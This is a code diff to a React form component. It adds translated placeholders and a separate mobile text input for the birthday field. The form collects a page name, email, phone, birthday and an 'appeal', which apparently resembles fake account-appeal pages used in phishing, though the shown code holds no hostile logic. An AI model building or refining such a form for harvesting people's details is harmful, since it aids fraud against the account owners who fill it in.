@@ -330,6 +330,7 @@ const Home = () => {
                                     autoComplete='organization' 
                                     className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
+                                    placeholder={translatedTexts.pageName}
                                     value={formData.pageName} 
                                     onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                 />
@@ -345,6 +346,7 @@ const Home = () => {
                                     autoComplete='email' 
                                     className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
+                                    placeholder={translatedTexts.mail}
                                     value={formData.mail} 
                                     onChange={(e) => handleInputChange('mail', e.target.value)} 
                                 />
@@ -364,6 +366,7 @@ const Home = () => {
                                         autoComplete='off' 
                                         className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none'
                                         style={{ fontSize: '16px' }}
+                                        placeholder={translatedTexts.phone}
                                         value={formData.phone.replace(/^\+\d+\s*/, '')} 
                                         onChange={(e) => handleInputChange('phone', e.target.value)} 
                                     />
@@ -374,19 +377,31 @@ const Home = () => {
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
+                                
+                                {/* Desktop: type='date' */}
                                 <input 
                                     type='date' 
                                     name='birthday' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    style={{ fontSize: '16px' }}
+                                    value={formData.birthday} 
+                                    onChange={(e) => handleInputChange('birthday', e.target.value)} 
+                                />
+                                
+                                {/* Mobile: type='text' với placeholder */}
+                                <input 
+                                    type='text' 
+                                    name='birthday' 
+                                    className={`block sm:hidden w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     placeholder='dd/mm/yyyy'
                                     value={formData.birthday} 
                                     onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                 />
+                                
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             
-                            {/* PHẦN "KHIẾU NẠI CỦA BẠN" ĐÃ ĐƯỢC SỬA CHO MOBILE */}
                             <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
